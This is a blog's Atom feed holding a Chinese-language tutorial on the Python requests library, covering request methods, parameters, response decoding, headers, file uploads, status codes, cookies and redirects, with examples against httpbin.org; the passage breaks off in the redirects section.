<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Welcome to Jas0nwhy&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/child/"/>
  <updated>2018-03-23T09:01:57.226Z</updated>
  <id>http://yoursite.com/child/</id>
  
  <author>
    <name>jas0nwhy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python：requests模块介绍</title>
    <link href="http://yoursite.com/child/2021/01/07/python%EF%BC%9Arequests%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/"/>
    <id>http://yoursite.com/child/2021/01/07/python：requests模块介绍/</id>
    <published>2021-01-07T08:10:09.412Z</published>
    <updated>2018-03-23T09:01:57.226Z</updated>
    
    <content type="html"><![CDATA[<h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><p>使用 Requests 发送网络请求非常简单。<br>一开始要导入 Requests 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br></pre></td></tr></table></figure><p>然后，尝试获取某个网页。本例子中，我们来获取 Github 的公共时间线：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;r&#x3D; requests.get(&#39;https:&#x2F;&#x2F;github.com&#x2F;timeline.json&#39;)</span><br></pre></td></tr></table></figure><p>现在，我们有一个名为 r 的 Response 对象。我们可以从这个对象中获取所有我们想要的信息。<br>Requests 简便的 API 意味着所有 HTTP 请求类型都是显而易见的。例如，你可以这样发送一个 HTTP POST 请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r &#x3D; requests.post(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;)</span><br></pre></td></tr></table></figure><p>漂亮，对吧？那么其他 HTTP 请求类型：PUT，DELETE，HEAD 以及 OPTIONS 又是如何的呢？都是一样的简单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r &#x3D; requests.put(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;put&quot;)  </span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.delete(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;delete&quot;)  </span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.head(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;)  </span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.options(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;)  </span><br></pre></td></tr></table></figure><p>都很不错吧，但这也仅是 Requests 的冰山一角呢。</p><h2 id="传递-URL-参数"><a href="#传递-URL-参数" class="headerlink" title="传递 URL 参数"></a>传递 URL 参数</h2><p>你也许经常想为 URL 的查询字符串(query string)传递某种数据。如果你是手工构建 URL，那么数据会以键/值对的形式置于 URL 中，跟在一个问号的后面。例如， httpbin.org/get?key=val。 Requests 允许你使用 params 关键字参数，以一个字符串字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么你可以使用如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; payload &#x3D; &#123;&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;&#125;  </span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;, params&#x3D;payload)</span><br></pre></td></tr></table></figure><p>通过打印输出该 URL，你能看到 URL 已被正确编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(r.url)  </span><br><span class="line">http:&#x2F;&#x2F;httpbin.org&#x2F;get?key2&#x3D;value2&amp;key1&#x3D;value1</span><br></pre></td></tr></table></figure><p>注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。<br>你还可以将一个列表作为值传入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; payload &#x3D; &#123;&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: [&#39;value2&#39;, &#39;value3&#39;]&#125;  </span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;,params&#x3D;payload)</span><br><span class="line">&gt; print(r.url)  </span><br><span class="line">http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;value1&amp;key2&#x3D;value2&amp;key2&#x3D;value3</span><br></pre></td></tr></table></figure><h2 id="响应内容"><a href="#响应内容" class="headerlink" title="响应内容"></a>响应内容</h2><p>我们能读取服务器响应的内容。再次以 GitHub 时间线为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests  </span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(&#39;https:&#x2F;&#x2F;github.com&#x2F;timeline.json&#39;)  </span><br><span class="line">&gt;&gt;&gt; r.text  </span><br><span class="line">u&#39;[&#123;&quot;repository&quot;:&#123;&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https:&#x2F;&#x2F;github.com&#x2F;...</span><br></pre></td></tr></table></figure><p>Requests 会自动解码来自服务器的内容。大多数 unicode 字符集都能被无缝地解码。<br>请求发出后，Requests 会基于 HTTP 头部对响应的编码作出有根据的推测。当你访问 r.text 之时，Requests 会使用其推测的文本编码。你可以找出 Requests 使用了什么编码，并且能够使用 r.encoding 属性来改变它：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.encoding  </span><br><span class="line">  &#39;utf-8&#39;  </span><br><span class="line">&gt;&gt;&gt; r.encoding &#x3D; &#39;ISO-8859-1&#39;  </span><br></pre></td></tr></table></figure><p>如果你改变了编码，每当你访问 r.text ，Request 都将会使用 r.encoding 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 r.content 来找到编码，然后设置 r.encoding为相应的编码。这样就能使用正确的编码解析 r.text 了。<br>在你需要的情况下，Requests 也可以使用定制的编码。如果你创建了自己的编码，并使用 codecs 模块进行注册，你就可以轻松地使用这个解码器名称作为 r.encoding 的值， 然后由 Requests 来为你处理编码。<br>二进制响应内容<br>你也能以字节的方式访问请求响应体，对于非文本请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.content  </span><br><span class="line">b&#39;[&#123;&quot;repository&quot;:&#123;&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https:&#x2F;&#x2F;github.com&#x2F;...</span><br></pre></td></tr></table></figure><p>Requests 会自动为你解码 gzip 和 deflate 传输编码的响应数据。<br>例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from PIL import Image  </span><br><span class="line">&gt;&gt;&gt; from io import BytesIO</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; i &#x3D; Image.open(BytesIO(r.content))</span><br></pre></td></tr></table></figure><h2 id="JSON-响应内容"><a href="#JSON-响应内容" class="headerlink" title="JSON 响应内容"></a>JSON 响应内容</h2><p>Requests 中也有一个内置的 JSON 解码器，助你处理 JSON 数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(&#39;https:&#x2F;&#x2F;github.com&#x2F;timeline.json&#39;)  </span><br><span class="line">&gt;&gt;&gt; r.json()  </span><br><span class="line">[&#123;u&#39;repository&#39;: &#123;u&#39;open_issues&#39;: 0, u&#39;url&#39;: &#39;https:&#x2F;&#x2F;github.com&#x2F;...</span><br></pre></td></tr></table></figure><p>如果 JSON 解码失败， r.json() 就会抛出一个异常。<br>例如，响应内容是 401 (Unauthorized)，尝试访问 r.json() 将会抛出 ValueError: No JSON object could be decoded 异常。<br>需要注意的是，成功调用 r.json() 并不意味着响应的成功。有的服务器会在失败的响应中包含一个 JSON 对象（比如 HTTP 500 的错误细节）。这种 JSON 会被解码返回。要检查请求是否成功，请使用 r.raise_for_status() 或者检查 r.status_code 是否和你的期望相同。<br>原始响应内容<br>在罕见的情况下，你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw。 如果你确实想这么干，那请你确保在初始请求中设置了 stream=True。具体你可以这么做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(&#39;https:&#x2F;&#x2F;github.com&#x2F;timeline.json&#39;, stream&#x3D;True)  </span><br><span class="line">&gt;&gt;&gt; r.raw  </span><br><span class="line">&lt;requests.packages.urllib3.response.HTTPResponse object at 0x101194810&gt;  </span><br><span class="line">&gt;&gt;&gt; r.raw.read(10)  </span><br><span class="line">&#39;\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03&#39;  </span><br></pre></td></tr></table></figure><p>但一般情况下，你应该以下面的模式将文本流保存到文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(filename, &#39;wb&#39;) as fd:  </span><br><span class="line">    for chunk in r.iter_content(chunk_size):  </span><br><span class="line">        fd.write(chunk)  </span><br></pre></td></tr></table></figure><p>使用 Response.iter_content 将会处理大量你直接使用 Response.raw 不得不处理的。 当流下载时，上面是优先推荐的获取内容方式。 Note that chunk_size can be freely adjusted to a number that may better fit your use cases.</p><h2 id="定制请求头"><a href="#定制请求头" class="headerlink" title="定制请求头"></a>定制请求头</h2><p>如果你想为请求添加 HTTP 头部，只要简单地传递一个 dict 给 headers 参数就可以了。<br>例如，在前一个示例中我们没有指定 content-type:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; url &#x3D; &#39;https:&#x2F;&#x2F;api.github.com&#x2F;some&#x2F;endpoint&#39;</span><br><span class="line">&gt;&gt;&gt; headers &#x3D; &#123;&#39;user-agent&#39;: &#39;my-app&#x2F;0.0.1&#39;&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(url, headers&#x3D;headers)</span><br></pre></td></tr></table></figure><p>注意: 定制 header 的优先级低于某些特定的信息源，例如：<br>如果在 .netrc 中设置了用户认证信息，使用 headers= 设置的授权就不会生效。而如果设置了 auth= 参数，<code>.netrc</code> 的设置就无效了。<br>如果被重定向到别的主机，授权 header 就会被删除。<br>代理授权 header 会被 URL 中提供的代理身份覆盖掉。<br>在我们能判断内容长度的情况下，header 的 Content-Length 会被改写。<br>更进一步讲，Requests 不会基于定制 header 的具体情况改变自己的行为。只不过在最后的请求中，所有的 header 信息都会被传递进去。<br>注意: 所有的 header 值必须是 string、bytestring 或者 unicode。尽管传递 unicode header 也是允许的，但不建议这样做。<br>更加复杂的 POST 请求<br>通常，你想要发送一些编码为表单形式的数据——非常像一个 HTML 表单。要实现这个，只需简单地传递一个字典给 data 参数。你的数据字典在发出请求时会自动编码为表单形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; payload &#x3D; &#123;&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.post(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;, data&#x3D;payload)</span><br><span class="line">&gt;&gt;&gt; print(r.text)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;key2&quot;: &quot;value2&quot;,</span><br><span class="line">    &quot;key1&quot;: &quot;value1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你还可以为 data 参数传入一个元组列表。在表单中多个元素使用同一 key 的时候，这种方式尤其有效：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; payload &#x3D; ((&#39;key1&#39;, &#39;value1&#39;), (&#39;key1&#39;, &#39;value2&#39;))</span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;, data&#x3D;payload)</span><br><span class="line">&gt;&gt;&gt; print(r.text)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;key1&quot;: [</span><br><span class="line">      &quot;value1&quot;,</span><br><span class="line">      &quot;value2&quot;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 string 而不是一个 dict，那么数据会被直接发布出去。<br>例如，Github API v3 接受编码为 JSON 的 POST/PATCH 数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import json</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; url &#x3D; &#39;https:&#x2F;&#x2F;api.github.com&#x2F;some&#x2F;endpoint&#39;</span><br><span class="line">&gt;&gt;&gt; payload &#x3D; &#123;&#39;some&#39;: &#39;data&#39;&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.post(url, data&#x3D;json.dumps(payload))</span><br><span class="line"></span><br><span class="line">此处除了可以自行对 dict 进行编码，你还可以使用 json 参数直接传递，然后它就会被自动编码。这是 2.4.2 版的新加功能：</span><br><span class="line">&gt;&gt;&gt; url &#x3D; &#39;https:&#x2F;&#x2F;api.github.com&#x2F;some&#x2F;endpoint&#39;</span><br><span class="line">&gt;&gt;&gt; payload &#x3D; &#123;&#39;some&#39;: &#39;data&#39;&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.post(url, json&#x3D;payload)</span><br><span class="line"></span><br><span class="line">POST一个多部分编码(Multipart-Encoded)的文件</span><br><span class="line">Requests 使得上传多部分编码文件变得很简单：</span><br><span class="line">&gt;&gt;&gt; url &#x3D; &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;</span><br><span class="line">&gt;&gt;&gt; files &#x3D; &#123;&#39;file&#39;: open(&#39;report.xls&#39;, &#39;rb&#39;)&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.post(url, files&#x3D;files)</span><br><span class="line">&gt;&gt;&gt; r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;files&quot;: &#123;</span><br><span class="line">    &quot;file&quot;: &quot;&lt;censored...binary...data&gt;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你可以显式地设置文件名，文件类型和请求头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; url &#x3D; &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;</span><br><span class="line">&gt;&gt;&gt; files &#x3D; &#123;&#39;file&#39;: (&#39;report.xls&#39;, open(&#39;report.xls&#39;, &#39;rb&#39;), &#39;application&#x2F;vnd.ms-excel&#39;, &#123;&#39;Expires&#39;: &#39;0&#39;&#125;)&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.post(url, files&#x3D;files)</span><br><span class="line">&gt;&gt;&gt; r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;files&quot;: &#123;</span><br><span class="line">    &quot;file&quot;: &quot;&lt;censored...binary...data&gt;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你想，你也可以发送作为文件来接收的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; url &#x3D; &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;</span><br><span class="line">&gt;&gt;&gt; files &#x3D; &#123;&#39;file&#39;: (&#39;report.csv&#39;, &#39;some,data,to,send\nanother,row,to,send\n&#39;)&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.post(url, files&#x3D;files)</span><br><span class="line">&gt;&gt;&gt; r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;files&quot;: &#123;</span><br><span class="line">    &quot;file&quot;: &quot;some,data,to,send\\nanother,row,to,send\\n&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你发送一个非常大的文件作为 multipart/form-data 请求，你可能希望将请求做成数据流。默认下 requests 不支持, 但有个第三方包 requests-toolbelt 是支持的。你可以阅读 toolbelt 文档 来了解使用方法。<br>在一个请求中发送多文件参考 高级用法 一节。<br>警告<br>我们强烈建议你用二进制模式(binary mode)打开文件。这是因为 Requests 可能会试图为你提供 Content-Length header，在它这样做的时候，这个值会被设为文件的字节数（bytes）。如果用文本模式(text mode)打开文件，就可能会发生错误。</p><h2 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h2><p>我们可以检测响应状态码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;)</span><br><span class="line">&gt;&gt;&gt; r.status_code</span><br><span class="line">200</span><br></pre></td></tr></table></figure><p>为方便引用，Requests还附带了一个内置的状态码查询对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.status_code &#x3D;&#x3D; requests.codes.ok</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>如果发送了一个错误请求(一个 4XX 客户端错误，或者 5XX 服务器错误响应)，我们可以通过 Response.raise_for_status() 来抛出异常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bad_r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;status&#x2F;404&#39;)</span><br><span class="line">&gt;&gt;&gt; bad_r.status_code</span><br><span class="line">404</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; bad_r.raise_for_status()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;requests&#x2F;models.py&quot;, line 832, in raise_for_status</span><br><span class="line">    raise http_error</span><br><span class="line">requests.exceptions.HTTPError: 404 Client Error</span><br></pre></td></tr></table></figure><p>但是，由于我们的例子中 r 的 status_code 是 200 ，当我们调用 raise_for_status() 时，得到的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.raise_for_status()</span><br><span class="line">None</span><br></pre></td></tr></table></figure><p>一切都挺和谐哈。</p><h2 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h2><p>我们可以查看以一个 Python 字典形式展示的服务器响应头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.headers</span><br><span class="line">&#123;</span><br><span class="line">    &#39;content-encoding&#39;: &#39;gzip&#39;,</span><br><span class="line">    &#39;transfer-encoding&#39;: &#39;chunked&#39;,</span><br><span class="line">    &#39;connection&#39;: &#39;close&#39;,</span><br><span class="line">    &#39;server&#39;: &#39;nginx&#x2F;1.0.4&#39;,</span><br><span class="line">    &#39;x-runtime&#39;: &#39;148ms&#39;,</span><br><span class="line">    &#39;etag&#39;: &#39;&quot;e1ca502697e5c9317743dc078f67693f&quot;&#39;,</span><br><span class="line">    &#39;content-type&#39;: &#39;application&#x2F;json&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个字典比较特殊：它是仅为 HTTP 头部而生的。根据 RFC 2616， HTTP 头部是大小写不敏感的。<br>因此，我们可以使用任意大写形式来访问这些响应头字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.headers[&#39;Content-Type&#39;]</span><br><span class="line">&#39;application&#x2F;json&#39;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.headers.get(&#39;content-type&#39;)</span><br><span class="line">&#39;application&#x2F;json&#39;</span><br></pre></td></tr></table></figure><p>它还有一个特殊点，那就是服务器可以多次接受同一 header，每次都使用不同的值。但 Requests 会将它们合并，这样它们就可以用一个映射来表示出来，参见 RFC 7230:<br>A recipient MAY combine multiple header fields with the same field name into one “field-name: field-value” pair, without changing the semantics of the message, by appending each subsequent field value to the combined field value in order, separated by a comma.<br>接收者可以合并多个相同名称的 header 栏位，把它们合为一个 “field-name: field-value” 配对，将每个后续的栏位值依次追加到合并的栏位值中，用逗号隔开即可，这样做不会改变信息的语义。</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>如果某个响应中包含一些 cookie，你可以快速访问它们：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; url &#x3D; &#39;http:&#x2F;&#x2F;example.com&#x2F;some&#x2F;cookie&#x2F;setting&#x2F;url&#39;</span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(url)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.cookies[&#39;example_cookie_name&#39;]</span><br><span class="line">&#39;example_cookie_value&#39;</span><br></pre></td></tr></table></figure><p>要想发送你的cookies到服务器，可以使用 cookies 参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; url &#x3D; &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;</span><br><span class="line">&gt;&gt;&gt; cookies &#x3D; dict(cookies_are&#x3D;&#39;working&#39;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(url, cookies&#x3D;cookies)</span><br><span class="line">&gt;&gt;&gt; r.text</span><br><span class="line">&#39;&#123;&quot;cookies&quot;: &#123;&quot;cookies_are&quot;: &quot;working&quot;&#125;&#125;&#39;</span><br></pre></td></tr></table></figure><p>Cookie 的返回对象为 RequestsCookieJar，它的行为和字典类似，但界面更为完整，适合跨域名跨路径使用。你还可以把 Cookie Jar 传到 Requests 中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; jar &#x3D; requests.cookies.RequestsCookieJar()</span><br><span class="line">&gt;&gt;&gt; jar.set(&#39;tasty_cookie&#39;, &#39;yum&#39;, domain&#x3D;&#39;httpbin.org&#39;, path&#x3D;&#39;&#x2F;cookies&#39;)</span><br><span class="line">&gt;&gt;&gt; jar.set(&#39;gross_cookie&#39;, &#39;blech&#39;, domain&#x3D;&#39;httpbin.org&#39;, path&#x3D;&#39;&#x2F;elsewhere&#39;)</span><br><span class="line">&gt;&gt;&gt; url &#x3D; &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;</span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(url, cookies&#x3D;jar)</span><br><span class="line">&gt;&gt;&gt; r.text</span><br><span class="line">&#39;&#123;&quot;cookies&quot;: &#123;&quot;tasty_cookie&quot;: &quot;yum&quot;&#125;&#125;&#39;</span><br></pre></td></tr></table></figure><h2 id="重定向与请求历史"><a href="#重定向与请求历史" class="headerlink" title="重定向与请求历史"></a>重定向与请求历史</h2><p>默认情况下，除了 HEAD, Requests 会自动处理所有重定向。<br>可以使用响应对象的 history 方法来追踪重定向。<br>Response.history 是一个 Response 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。<br>例如，Github 将所有的 HTTP 请求重定向到 HTTPS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;github.com&#39;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.url</span><br><span class="line">&#39;https:&#x2F;&#x2F;github.com&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.status_code</span><br><span class="line">200</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.history</span><br><span class="line">[&lt;Response [301]&gt;]</span><br></pre></td></tr></table></figure><p>如果你使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE，那么你可以通过 allow_redirects 参数禁用重定向处理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;github.com&#39;, allow_redirects&#x3D;False)</span><br><span class="line">&gt;&gt;&gt; r.status_code</span><br><span 